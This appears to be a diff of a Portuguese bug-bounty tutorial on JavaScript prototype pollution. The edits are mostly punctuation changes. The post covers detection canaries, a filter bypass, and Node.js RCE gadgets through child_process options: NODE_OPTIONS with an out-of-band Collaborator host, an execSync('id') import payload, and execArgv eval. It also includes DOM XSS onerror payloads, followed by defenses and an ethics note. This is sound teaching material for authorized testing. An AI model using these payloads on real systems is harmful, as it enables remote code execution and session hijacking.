@@ -18,7 +18,7 @@ Imagina que você manda esse parâmetro inocente na URL de uma SPA:
 https://app.exemplo.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
 ```
 
-A página recarrega e... `alert(1)`. Você não tocou em nenhum campo, não achou um `<input>` refletido, não passou por um sanitizador. Você injetou uma propriedade no **prototype global** do JavaScript, e um trecho qualquer da aplicação leu essa propriedade achando que era dele. Isso é **Prototype Pollution** (poluição de prototype): uma das classes mais elegantes — e mais subestimadas — da segurança web moderna.
+A página recarrega e... `alert(1)`. Você não tocou em nenhum campo, não achou um `<input>` refletido, não passou por um sanitizador. Você injetou uma propriedade no **prototype global** do JavaScript, e um trecho qualquer da aplicação leu essa propriedade achando que era dele. Isso é **Prototype Pollution** (poluição de prototype): uma das classes mais elegantes (e mais subestimadas) da segurança web moderna.
 
 É elegante porque ataca o **núcleo da linguagem**, não a aplicação. E é subestimada porque sozinha ela quase nunca "faz nada": ela é uma **primitiva** (uma capacidade base) que precisa de um segundo ingrediente, o *gadget*, pra virar algo crítico. Quando os dois se encontram, o resultado vai de [DOM XSS](/posts/xss-html-injection/) no navegador a [RCE](/posts/rce-command-injection-ssti/) (execução remota de código) no servidor.
 
@@ -28,7 +28,7 @@ Neste post a gente parte do zero (o que é prototype em JS) e chega no avançado
 
 ## O que é prototype e herança em JavaScript
 
-Pra entender a falha, primeiro o alicerce. Em JavaScript, **todo objeto tem um prototype** — um objeto "pai" do qual ele herda propriedades e métodos. Quando você acessa `obj.toString`, o JS procura `toString` no próprio `obj`; se não acha, sobe pro prototype; se não acha lá, sobe pro prototype do prototype, e assim por diante. Isso é a **cadeia de prototypes** (prototype chain).
+Pra entender a falha, primeiro o alicerce. Em JavaScript, **todo objeto tem um prototype**, um objeto "pai" do qual ele herda propriedades e métodos. Quando você acessa `obj.toString`, o JS procura `toString` no próprio `obj`; se não acha, sobe pro prototype; se não acha lá, sobe pro prototype do prototype, e assim por diante. Isso é a **cadeia de prototypes** (prototype chain).
 
 > 💡 **Prototype**: objeto "molde/pai" do qual outro objeto herda propriedades; o motor do JS consulta a cadeia de prototypes quando não acha a propriedade no próprio objeto.
 
@@ -43,7 +43,7 @@ Object.getPrototypeOf(usuario) === Object.prototype;  // true
 usuario.__proto__ === Object.prototype;               // true (mesma coisa, atalho legado)
 ```
 
-> **Analogia:** pense no `Object.prototype` como o **manual padrão da fábrica** que vem dentro de **todo** produto. Se alguém conseguir editar esse manual mestre, todo produto que sair da fábrica — e todos os que já existem — passa a "saber" daquela instrução nova. Não importa o modelo: geladeira, TV, micro-ondas. Todos herdam.
+> **Analogia:** pense no `Object.prototype` como o **manual padrão da fábrica** que vem dentro de **todo** produto. Se alguém conseguir editar esse manual mestre, todo produto que sair da fábrica (e todos os que já existem) passa a "saber" daquela instrução nova. Não importa o modelo: geladeira, TV, micro-ondas. Todos herdam.
 
 Duas formas de chegar nesse manual mestre a partir de qualquer objeto:
 
@@ -69,20 +69,20 @@ b.poluido;                       // "sim"  <- ele NUNCA recebeu isso; herdou do 
 
 Repare: o objeto `b` jamais recebeu `poluido`. Ele **herdou** porque a propriedade está no manual mestre. Esse é o coração da falha — você não modifica *um* objeto, você modifica o **comportamento padrão de todos eles**.
 
-Por que `__proto__` causa isso? Porque, em JavaScript, `__proto__` **não é uma propriedade comum**: é um acessor especial (definido no próprio `Object.prototype`) que, ao ser **lido**, retorna o prototype do objeto. Então `obj["__proto__"]["x"] = 1` não cria a chave literal `"__proto__"` dentro de `obj` — ele resolve `obj.__proto__` para `Object.prototype` e escreve `x` **lá**. É exatamente esse comportamento que código vulnerável aciona sem perceber.
+Por que `__proto__` causa isso? Porque, em JavaScript, `__proto__` **não é uma propriedade comum**: é um acessor especial (definido no próprio `Object.prototype`) que, ao ser **lido**, retorna o prototype do objeto. Então `obj["__proto__"]["x"] = 1` não cria a chave literal `"__proto__"` dentro de `obj`. Ele resolve `obj.__proto__` para `Object.prototype` e escreve `x` **lá**. É exatamente esse comportamento que código vulnerável aciona sem perceber.
 
 ## Impacto e quanto paga
 
-Sozinha, a poluição raramente é o fim — ela é a **primitiva**. O impacto vem do **gadget** que ela alimenta:
+Sozinha, a poluição raramente é o fim. Ela é a **primitiva**, e o impacto vem do **gadget** que ela alimenta:
 
 > 💡 **Gadget**: um trecho do código (da app ou de uma lib) que **lê** uma propriedade que o atacante consegue poluir e a usa de forma perigosa (ex.: joga em `innerHTML`, `eval`, opções de `child_process`).
 
 - **Client-side → DOM XSS**: uma propriedade poluída cai num sink perigoso do DOM e executa JavaScript no navegador da vítima. Daí o caminho é o mesmo de qualquer [XSS](/posts/xss-html-injection/): roubo de sessão, ações na conta, [Account Takeover](/posts/account-takeover/).
-- **Server-side (Node.js) → DoS, bypass de lógica/auth e RCE**: derrubar o processo (negação de serviço), burlar checagens que leem flags herdadas, ou — no pior caso — execução remota de código no servidor.
+- **Server-side (Node.js) → DoS, bypass de lógica/auth e RCE**: derrubar o processo (negação de serviço), burlar checagens que leem flags herdadas, ou, no pior caso, execução remota de código no servidor.
 
 > 💡 **Sink**: o "ponto de chegada" perigoso onde dado controlável vira efeito (executar HTML/JS, rodar comando, etc.). O oposto é a *source* (ponto de entrada).
 
-Em programas de bug bounty, o valor segue o impacto: um prototype pollution **isolado, sem gadget demonstrável**, costuma ser tratado como informativo ou pagar pouco (de algumas centenas de reais). Encadeado num **DOM XSS confiável** já entra em faixa de milhares; e um **RCE em Node** confirmado vai para o topo da tabela (dezenas de milhares), porque é uma das consequências mais graves possíveis. Lição: **prototype pollution só "vale" o que o gadget entrega** — invista em achar o gadget. Veja [Severidade e Triagem](/posts/severidade-impacto-triagem/) e [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/).
+Em programas de bug bounty, o valor segue o impacto: um prototype pollution **isolado, sem gadget demonstrável**, costuma ser tratado como informativo ou pagar pouco (de algumas centenas de reais). Encadeado num **DOM XSS confiável** já entra em faixa de milhares; e um **RCE em Node** confirmado vai para o topo da tabela (dezenas de milhares), porque é uma das consequências mais graves possíveis. Lição: **prototype pollution só "vale" o que o gadget entrega**. Invista em achar o gadget. Veja [Severidade e Triagem](/posts/severidade-impacto-triagem/) e [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/).
 
 > ⚠️ A falha ficou famosa depois da pesquisa de **Olivier Arteau** (NorthSec 2018), que mostrou como atacar libs de `merge` no Node, e da pesquisa client-side de **Gareth Heyes / PortSwigger** sobre gadgets disseminados. Não é teoria: lodash, jQuery, Mongoose e outras libs enormes já tiveram CVEs dessa classe.
 
@@ -150,7 +150,7 @@ Content-Type: application/json
 | Via `__proto__` | Vetor direto | — |
 | Via `constructor.prototype` | Quando `__proto__` é filtrado | bypass de sanitização |
 
-## Recon — onde procurar
+## Recon: onde procurar
 
 Prototype pollution vive onde a aplicação **constrói objetos a partir de entrada estruturada**:
 
@@ -159,21 +159,21 @@ Prototype pollution vive onde a aplicação **constrói objetos a partir de entr
 - **`postMessage`** que faz `JSON.parse` da `event.data` e mescla.
 - **APIs Node** que recebem JSON e fazem merge em opções/config (veja [Segurança de APIs](/posts/api-security/)).
 
-Como caçar nos arquivos JavaScript (igual ao recon de [IDOR](/posts/broken-access-control-idor-bola-bfla/) — leia os `.js`):
+Como caçar nos arquivos JavaScript (igual ao recon de [IDOR](/posts/broken-access-control-idor-bola-bfla/), leia os `.js`):
 
 ```bash
 # coleta as URLs históricas e filtra os arquivos .js para ler
 # (gau = junta URLs conhecidas do alvo; httpx = confirma quais respondem)
-echo https://alvo.com | gau | grep '\.js$' | httpx -mc 200
+echo alvo.com | gau | grep '\.js$' | httpx -mc 200
 # nos arquivos, procure as assinaturas perigosas:
 #   merge( , deepExtend( , defaultsDeep( , $.extend(true , JSON.parse( , location.hash
 ```
 
-> 💡 **gau / httpx**: ferramentas de [recon](/posts/recon-discovery/) — `gau` lista URLs já conhecidas de um domínio; `httpx` checa rapidamente quais estão vivas.
+> 💡 **gau / httpx**: ferramentas de [recon](/posts/recon-discovery/). O `gau` lista URLs já conhecidas de um domínio; o `httpx` checa rapidamente quais estão vivas.
 
 ## Detecção passo a passo
 
-### Client-side — o teste de 1 linha
+### Client-side: o teste de 1 linha
 
 A detecção é **não-destrutiva** e direta: injete uma propriedade-canário e cheque se ela apareceu em `Object.prototype`.
 
@@ -202,37 +202,37 @@ E o bypass clássico de sanitização **não-recursiva** (quando o filtro remove
 ?__pro__proto__to__[teste]=x     # vira "__proto__" depois que o filtro tira o miolo
 ```
 
-### Server-side — detecção sem ver o código
+### Server-side: detecção sem ver o código
 
 No servidor você não tem console. As técnicas da PortSwigger exploram **efeitos colaterais observáveis** na resposta:
 
-1. **Reflexão de propriedade** — injete e veja se volta:
+1. **Reflexão de propriedade**, injete e veja se volta:
 
 ```json
 {"__proto__": {"foo": "bar"}}
 ```
 Se a resposta passar a refletir `"foo":"bar"`, poluiu.
 
-2. **`json spaces`** (a mais confiável, não depende de reflexão) — o Express usa a config `json spaces` pra indentar respostas JSON. Poluindo-a, **toda** resposta JSON muda a indentação:
+2. **`json spaces`** (a mais confiável, não depende de reflexão). O Express usa a config `json spaces` pra indentar respostas JSON. Poluindo-a, **toda** resposta JSON muda a indentação:
 
 ```json
 {"__proto__": {"json spaces": 10}}
 ```
 Se as respostas JSON seguintes vierem com 10 espaços de indentação, está poluído.
 
-3. **`status` override** — injetar um status HTTP incomum e disparar um erro depois; se a resposta de erro voltar com aquele status, confirma. O módulo `http-errors` só aceita status na faixa **400–599**, então escolha um código obscuro dessa faixa (ex.: `510`) que dificilmente apareceria por outro motivo:
+3. **`status` override**: injetar um status HTTP incomum e disparar um erro depois; se a resposta de erro voltar com aquele status, confirma. O módulo `http-errors` só aceita status na faixa **400–599**, então escolha um código obscuro dessa faixa (ex.: `510`) que dificilmente apareceria por outro motivo:
 
 ```json
 {"__proto__": {"status": 510}}
 ```
 
-4. **`content-type` override (charset UTF-7)** — poluir o charset padrão das respostas faz o servidor decodificar a saída como UTF-7; se uma string como `+AGYAbwBv-` voltar decodificada para `foo`, confirma:
+4. **`content-type` override (charset UTF-7)**: poluir o charset padrão das respostas faz o servidor decodificar a saída como UTF-7; se uma string como `+AGYAbwBv-` voltar decodificada para `foo`, confirma:
 
 ```json
 {"__proto__": {"content-type": "application/json; charset=utf-7"}}
 ```
 
-5. **`exposedHeaders` (CORS)** — se a app usa o módulo `cors`, poluir esse array faz seus valores aparecerem no header `Access-Control-Expose-Headers` da resposta (requer o módulo `cors` instalado):
+5. **`exposedHeaders` (CORS)**: se a app usa o módulo `cors`, poluir esse array faz seus valores aparecerem no header `Access-Control-Expose-Headers` da resposta (requer o módulo `cors` instalado):
 
 ```json
 {"__proto__": {"exposedHeaders": ["foo"]}}
@@ -286,7 +286,7 @@ Object.defineProperty(Object.prototype, "transport_url", {
 
 O gadget mais potente no Node são as **opções de `child_process`**. Quando a app cria um subprocesso (`spawn`/`exec`/`fork`) **sem passar todas as opções explicitamente**, o objeto de opções herda chaves poluídas. Payloads verificados na PortSwigger Academy:
 
-**Via `NODE_OPTIONS` + `shell`** (prova de conceito com [SSRF](/posts/ssrf/)/out-of-band pra confirmar execução). O `NODE_OPTIONS` **bloqueia `--eval`**, mas aceita `--inspect=host:port` — ao iniciar o subprocesso, o Node tenta abrir o debugger nesse host, gerando uma interação out-of-band (DNS/HTTP no Collaborator) que confirma a execução sem precisar do filesystem:
+**Via `NODE_OPTIONS` + `shell`** (prova de conceito com [SSRF](/posts/ssrf/)/out-of-band pra confirmar execução). O `NODE_OPTIONS` **bloqueia `--eval`**, mas aceita `--inspect=host:port`. Ao iniciar o subprocesso, o Node tenta abrir o debugger nesse host, gerando uma interação out-of-band (DNS/HTTP no Collaborator) que confirma a execução sem precisar do filesystem:
 
 ```json
 {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=ID-DO-COLLABORATOR.oastify.com"}}
@@ -298,7 +298,7 @@ A partir do **Node 19**, o `--import` (com `data:` URL) também passa pelo `NODE
 {"__proto__": {"NODE_OPTIONS": "--import=\"data:text/javascript,import('child_process').then(c=>c.execSync('id'))\""}}
 ```
 
-**Via `execArgv` do `fork()`** — injeta argumentos de execução do Node:
+**Via `execArgv` do `fork()`**: injeta argumentos de execução do Node:
 
 ```json
 {"__proto__": {"execArgv": ["--eval=require('child_process').execSync('id')"]}}
@@ -310,7 +310,7 @@ A partir do **Node 19**, o `--import` (com `data:` URL) também passa pelo `NODE
 {"__proto__": {"shell": "vim", "input": ":! id\n"}}
 ```
 
-A mecânica geral está em [RCE / Command Injection](/posts/rce-command-injection-ssti/). A diferença aqui é que você não injeta no comando — você **envenena as opções** que o Node usa pra montar o processo.
+A mecânica geral está em [RCE / Command Injection](/posts/rce-command-injection-ssti/). A diferença aqui é que você não injeta no comando. Você **envenena as opções** que o Node usa pra montar o processo.
 
 ## Caso real-fictício: CSPP → DOM XSS em SPA
 
@@ -318,7 +318,7 @@ A mecânica geral está em [RCE / Command Injection](/posts/rce-command-injectio
 
 Você testa `app.exemplo.com`, uma SPA. Nos arquivos `.js`, encontra uma lib que monta config a partir do hash da URL e, mais adiante, um trecho que faz `el.innerHTML = config.welcomeHTML`. Dois ingredientes na mão: source (hash) + sink (`innerHTML`).
 
-**Passo 1 — Confirmar a source.** Acesso com canário e checo no console:
+**Passo 1, confirmar a source.** Acesso com canário e checo no console:
 
 ```
 https://app.exemplo.com/#__proto__[canario]=1
@@ -327,17 +327,17 @@ https://app.exemplo.com/#__proto__[canario]=1
 Object.prototype.canario;   // "1" -> poluível pelo hash
 ```
 
-**Passo 2 — Apontar pro gadget.** `welcomeHTML` não é definido pela app naquele fluxo, então herda do prototype:
+**Passo 2, apontar pro gadget.** `welcomeHTML` não é definido pela app naquele fluxo, então herda do prototype:
 
 ```
 https://app.exemplo.com/#__proto__[welcomeHTML]=<img src=x onerror=alert(document.domain)>
 ```
 
-**Passo 3 — Resultado.** A página renderiza, `config.welcomeHTML` resolve pro meu HTML herdado, `innerHTML` injeta a tag e o `onerror` dispara. **DOM XSS confirmado**, sem nenhum input clássico envolvido.
+**Passo 3, resultado.** A página renderiza, `config.welcomeHTML` resolve pro meu HTML herdado, `innerHTML` injeta a tag e o `onerror` dispara. **DOM XSS confirmado**, sem nenhum input clássico envolvido.
 
-**O que a tela mostraria:** um `alert(document.domain)` na origem `app.exemplo.com`; no DevTools, `Object.prototype.welcomeHTML` mostrando o payload; no Network, nenhuma request de formulário — só a navegação com o hash.
+**O que a tela mostraria:** um `alert(document.domain)` na origem `app.exemplo.com`; no DevTools, `Object.prototype.welcomeHTML` mostrando o payload; no Network, nenhuma request de formulário, só a navegação com o hash.
 
-**Passo 4 — Report.** Título `[Prototype Pollution] DOM XSS via __proto__ no hash da URL → execução de JS na origem`. Demonstre a cadeia source → gadget → sink e o impacto (sequestro de sessão). Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).
+**Passo 4, report.** Título `[Prototype Pollution] DOM XSS via __proto__ no hash da URL → execução de JS na origem`. Demonstre a cadeia source → gadget → sink e o impacto (sequestro de sessão). Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).
 
 ## Defesa em camadas
 
@@ -349,7 +349,7 @@ A correção real é **cortar a primitiva** (impedir escrita no prototype) e/ou 
 Object.freeze(Object.prototype);   // tentativas de escrever em Object.prototype param de funcionar
 ```
 
-> ⚠️ Detalhe importante: depois do `freeze`, a escrita **falha silenciosamente em modo não-estrito**, mas **lança `TypeError` em modo estrito** (`"use strict"`, módulos ES e corpos de `class` são sempre estritos). Em qualquer caso a poluição é bloqueada — só esteja ciente de que pode virar exceção. Congele cedo, na inicialização, antes de qualquer `merge`.
+> ⚠️ Detalhe importante: depois do `freeze`, a escrita **falha silenciosamente em modo não-estrito**, mas **lança `TypeError` em modo estrito** (`"use strict"`, módulos ES e corpos de `class` são sempre estritos). Em qualquer caso a poluição é bloqueada; só esteja ciente de que pode virar exceção. Congele cedo, na inicialização, antes de qualquer `merge`.
 
 **2. Use estruturas que não herdam de `Object.prototype`:**
 
@@ -378,24 +378,24 @@ function mergeSeguro(alvo, fonte) {
 const seguro = JSON.parse(corpo, (chave, valor) => chave === "__proto__" ? undefined : valor);
 ```
 
-**5. Use libs já corrigidas e mantidas.** Ex.: lodash **≥ 4.17.12** corrigiu o [CVE-2019-10744](https://github.com/advisories/GHSA-jf85-cpcp-j695) — poluição em `defaultsDeep` via `constructor.prototype`, classificada como **Crítica: CVSS v3.1 9.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`; o NVD ainda não publicou score CVSS v4.0). Antes disso, `merge`/`mergeWith`/`defaultsDeep` já haviam sido afetados pelo [CVE-2018-3721](https://nvd.nist.gov/vuln/detail/CVE-2018-3721) (via `__proto__`, corrigido em 4.17.5) e pelo [CVE-2018-16487](https://nvd.nist.gov/vuln/detail/CVE-2018-16487) (correção incompleta do anterior, via `constructor.prototype`, corrigido em 4.17.11). Mantenha dependências atualizadas — veja [Security Misconfiguration & CVE Hunting](/posts/security-misconfiguration-cve-hunting/).
+**5. Use libs já corrigidas e mantidas.** Ex.: lodash **≥ 4.17.12** corrigiu o [CVE-2019-10744](https://github.com/advisories/GHSA-jf85-cpcp-j695), poluição em `defaultsDeep` via `constructor.prototype`, classificada como **Crítica: CVSS v3.1 9.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`; o NVD ainda não publicou score CVSS v4.0). Antes disso, `merge`/`mergeWith`/`defaultsDeep` já haviam sido afetados pelo [CVE-2018-3721](https://nvd.nist.gov/vuln/detail/CVE-2018-3721) (via `__proto__`, corrigido em 4.17.5) e pelo [CVE-2018-16487](https://nvd.nist.gov/vuln/detail/CVE-2018-16487) (correção incompleta do anterior, via `constructor.prototype`, corrigido em 4.17.11). Mantenha dependências atualizadas. Veja [Security Misconfiguration & CVE Hunting](/posts/security-misconfiguration-cve-hunting/).
 
 **6. No Node, passe opções de `child_process` explicitamente** (não deixe herdar) e valide entrada com **schema** (defina os campos esperados; tudo fora dele é rejeitado).
 
-**7. Endureça o runtime do Node** com a flag [`--disable-proto`](https://nodejs.org/api/cli.html#--disable-protomode), que desativa o acessor mágico `Object.prototype.__proto__` em todo o processo (`--disable-proto=delete` o remove; `=throw` lança erro ao usá-lo) — fecha o vetor mais comum sem depender de cada `merge` filtrar a chave:
+**7. Endureça o runtime do Node** com a flag [`--disable-proto`](https://nodejs.org/api/cli.html#--disable-protomode), que desativa o acessor mágico `Object.prototype.__proto__` em todo o processo (`--disable-proto=delete` o remove; `=throw` lança erro ao usá-lo). Fecha o vetor mais comum sem depender de cada `merge` filtrar a chave:
 
 ```bash
 node --disable-proto=delete app.js
 ```
 
-> ❌ **O que NÃO basta:** filtrar só `__proto__` e esquecer `constructor`/`prototype`; filtrar uma vez só (vulnerável ao `__pro__proto__to__`); confiar que "é só client-side" — gadgets server-side existem e levam a RCE.
+> ❌ **O que NÃO basta:** filtrar só `__proto__` e esquecer `constructor`/`prototype`; filtrar uma vez só (vulnerável ao `__pro__proto__to__`); confiar que "é só client-side", quando gadgets server-side existem e levam a RCE.
 
 ## Ferramentas + labs legais
 
-- **DOM Invader** (embutido no navegador do Burp Suite): detecta automaticamente sources de prototype pollution na URL e em `postMessage`, e ainda **escaneia gadgets** e gera PoC de XSS. É o jeito mais rápido de achar CSPP — pesquisa de Gareth Heyes/PortSwigger.
+- **DOM Invader** (embutido no navegador do Burp Suite): detecta automaticamente sources de prototype pollution na URL e em `postMessage`, e ainda **escaneia gadgets** e gera PoC de XSS. É o jeito mais rápido de achar CSPP (pesquisa de Gareth Heyes/PortSwigger).
 - **PPScan** / extensões de "prototype pollution scanner": varrem sources client-side automaticamente enquanto você navega.
 - **Server-Side Prototype Pollution Scanner** (extensão do Burp BApp Store): testa as técnicas server-side (`json spaces`, status etc.).
-- **Labs autorizados:** [PortSwigger Web Security Academy — Prototype pollution](https://portswigger.net/web-security/prototype-pollution) (client-side e server-side, com labs guiados — a melhor fonte gratuita).
+- **Labs autorizados:** [PortSwigger Web Security Academy — Prototype pollution](https://portswigger.net/web-security/prototype-pollution) (client-side e server-side, com labs guiados, a melhor fonte gratuita).
 
 ## Checklist do caçador
 
@@ -403,7 +403,7 @@ node --disable-proto=delete app.js
 - [ ] Testei o canário `?__proto__[teste]=x` e confirmei em `Object.prototype.teste` (console).
 - [ ] Tentei as alternativas: `constructor[prototype]`, notação com ponto, e o bypass `__pro__proto__to__`.
 - [ ] Server-side: testei `json spaces`, `status` (faixa 400–599), `content-type`/charset, `exposedHeaders` e reflexão de propriedade (de forma não-destrutiva, no escopo).
-- [ ] **Cacei o gadget** (DOM Invader / `Object.defineProperty` armadilha) — sem gadget, o impacto é baixo.
+- [ ] **Cacei o gadget** (DOM Invader / `Object.defineProperty` armadilha); sem gadget, o impacto é baixo.
 - [ ] Client-side: liguei a propriedade poluída a um sink (`innerHTML`, `script.src`, `eval`).
 - [ ] Server-side: testei gadgets de `child_process` (`shell`/`NODE_OPTIONS`/`execArgv`) com confirmação out-of-band.
 - [ ] Documentei a cadeia **source → gadget → sink** no report.
@@ -411,10 +411,10 @@ node --disable-proto=delete app.js
 ## Pegadinhas e o que NÃO funciona
 
 - **Poluir sem gadget ≠ vulnerabilidade explorável.** Muitos triagistas pedem o impacto. Sempre busque a cadeia completa.
-- **`JSON.parse` sozinho não polui** — ele cria a chave literal `"__proto__"`; o estrago vem do `merge`/`clone` posterior.
+- **`JSON.parse` sozinho não polui**: ele cria a chave literal `"__proto__"`; o estrago vem do `merge`/`clone` posterior.
 - **Filtrar só `__proto__`** deixa `constructor.prototype` aberto. Bloqueie os três nomes.
 - **Sanitização não-recursiva** cai pro `__pro__proto__to__`.
-- **Em server-side, lembre da persistência:** sua poluição afeta outros usuários do mesmo processo — cuidado pra não causar DoS acidental.
+- **Em server-side, lembre da persistência:** sua poluição afeta outros usuários do mesmo processo, então cuidado pra não causar DoS acidental.
 
 ## O que você precisa lembrar
 
@@ -423,11 +423,11 @@ node --disable-proto=delete app.js
 - Detecção client-side é o canário `?__proto__[teste]=x` + checagem em `Object.prototype`; server-side usa efeitos como `json spaces`.
 - Defesa: `Object.freeze(Object.prototype)`, `Object.create(null)`/`Map`, rejeitar `__proto__`/`constructor`/`prototype`, `node --disable-proto`, libs atualizadas.
 
-> 💡 **Dica de ouro:** poluir é fácil, **o ouro está no gadget**. Quando confirmar a poluição, pare de comemorar e vá caçar quem **lê** aquela propriedade — é o gadget que transforma uma curiosidade em DOM XSS ou RCE. Sem ele, você tem metade de um bug.
+> 💡 **Dica de ouro:** poluir é fácil, **o ouro está no gadget**. Quando confirmar a poluição, pare de comemorar e vá caçar quem **lê** aquela propriedade. É o gadget que transforma uma curiosidade em DOM XSS ou RCE. Sem ele, você tem metade de um bug.
 
 ## Nota ética
 
-Prototype pollution server-side **altera o processo inteiro** e pode derrubar o serviço para outros usuários — teste apenas em alvos autorizados, com canários inócuos e, de preferência, em staging. Tudo aqui é para bug bounty (dentro do escopo), pentests contratados e labs legais. Use para proteger, reportar com responsabilidade e ensinar.
+Prototype pollution server-side **altera o processo inteiro** e pode derrubar o serviço para outros usuários. Teste apenas em alvos autorizados, com canários inócuos e, de preferência, em staging. Tudo aqui é para bug bounty (dentro do escopo), pentests contratados e labs legais. Use para proteger, reportar com responsabilidade e ensinar.
 
 ## Referências
 
